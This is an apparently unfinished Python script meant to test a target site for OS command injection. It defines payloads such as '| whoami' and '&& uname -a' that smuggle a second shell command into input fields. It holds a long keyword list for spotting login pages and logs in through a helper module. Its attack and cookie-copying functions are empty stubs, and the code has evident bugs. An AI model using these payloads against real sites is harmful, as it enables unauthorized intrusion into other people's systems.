import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import html_field_finder

payloads = [
    "| whoami",
    "&& whoami",
    "| id",
    "| uname -a",
    "&& uname -a"
]

html_check_list = [
    "login", "log-in", "log_in", "signin", "sign-in", "sign_in",
    "username", "user", "userid", "user-id", "user_name", "email", "e-mail",
    "password", "pass", "pwd", "passwd",
    "auth", "authenticate", "authentication", "credentials",
    "account", "access", "member", "membership",
    "connect", "connexion", "session", "startsession",
    "secure", "admin", "administrator", "portal",
    "token", "userlogin", "user-signin", "password_field",
    "continue", "submit", "enter", "proceed",
    "dashboard", "panel", "signon", "sign_on",
    "input type=\"password\"", "input name=\"password\"",
    "input id=\"password\"", "input type='password'",
    "remember me", "forgot password", "reset password",
    "form-login", "form_signin", "login-form", "auth-form",
    "access account", "clientlogin", "stafflogin", "adminlogin",
    "loginbutton", "signinbutton", "submitlogin",
    "input name=\"username\"", "input id=\"username\"",
    "input name='username'", "input id='username'",
    "login to your account", "sign in to your account",
    "تسجيل الدخول",  # Arabic
    "connexion",  # French
    "anmelden",  # German
    "ログイン",  # Japanese
    "로그인",  # Korean
    "登录",  # Chinese
    "вход",  # Russian
]

def command_injection():
    url = input("Who is the target (http://example.com/page):").strip()
    redir = url_compare(url)
    if redir and check_login(redir):
        html_field_finder.login_to_site(redir)
        if check_login(html_field_finder.last_responce):
            print("[+++]Now we can attack...")


    




def url_compare(url_c):
    if "http" in url_c:
        final_url = requests.get(url_c, allow_redirects=True)
    
    if url_c == final_url.url:
        print("There is no redirection")
        return 0
    else:
        print(f"We had redirection from {url_c} to {final_url.url}")
        return final_url.url



def check_login(html):
    return any(tag in html.lower() for tag in html_check_list)


# def copy_cookie():



# def attack():


if __name__ == "__main__":
    command_injection()